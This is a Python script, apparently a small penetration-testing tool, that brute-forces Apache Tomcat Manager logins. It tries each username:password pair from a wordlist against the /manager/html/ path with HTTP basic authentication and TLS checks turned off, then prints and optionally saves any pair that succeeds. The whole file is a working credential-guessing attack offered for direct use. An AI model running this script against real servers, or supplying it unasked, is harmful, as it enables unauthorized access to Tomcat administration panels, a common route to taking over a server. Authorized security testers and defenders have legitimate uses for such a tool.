import requests
import argparse

class Tomcat_Scanner():
    def __init__(self,url,wordlist,output_file):
        self.url = url
        self.wordlist = wordlist
        self.output_file = output_file
        self.output_file_check()
    
    def output_file_check(self):
        if args.o:
            self.scanner_with_file()
        else:
            self.scanner_nofile()

    def scanner_nofile(self):
        requests.packages.urllib3.disable_warnings()
        full_url = self.url + "/manager/html/"

        with open(self.wordlist) as wordlist_file:
            for creds in wordlist_file:
                creds = creds.strip()
                username,password = creds.split(":")

                req_site = requests.get(full_url,auth=(username,password),verify=False)
            
                if req_site.status_code == 200:
                    print("Founds Credentials: " + creds)
                else:
                    continue
        
        wordlist_file.close()
        print("Done!")

    def scanner_with_file(self):
        requests.packages.urllib3.disable_warnings()
        full_url = self.url + "/manager/html/"
        
        creds_found_file = open(self.output_file,"w")
        creds_found_file.write("Found Credentials:\n")
        creds_found_file.close()

        with open(self.wordlist) as wordlist_file:
            for creds in wordlist_file:
                creds = creds.strip()
                username,password = creds.split(":")

                req_site = requests.get(full_url,auth=(username,password),verify=False)
            
                if req_site.status_code == 200:
                    print("Founds Credentials: " + creds)
                    creds_found_file = open(self.output_file,"a")
                    creds_found_file.write(creds)
                    creds_found_file.write("\n")
                    creds_found_file.close()
                else:
                    continue
        
        wordlist_file.close()
        print("Done! Check your " + self.output_file + " for any passwords found!")

if __name__ == "__main__":
    print("Welcome to Tomcat user:password scanner!")
    print("Scanning for usernames and passwords...")
    parser = argparse.ArgumentParser(description='Tomcat User:Password Scanner')

    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://scantomcat.blah', required=True)
    parser.add_argument('-w', metavar="<Wordlist>",help='WordList To Use. Required format is username:password', required=True)
    parser.add_argument('-o', metavar='<Output>', help='Name of output file', required=False)

    args = parser.parse_args()
    
    try:
        Tomcat_Scanner(args.t,args.w,args.o)
    except KeyboardInterrupt:
        print("Bye Bye!")
        exit()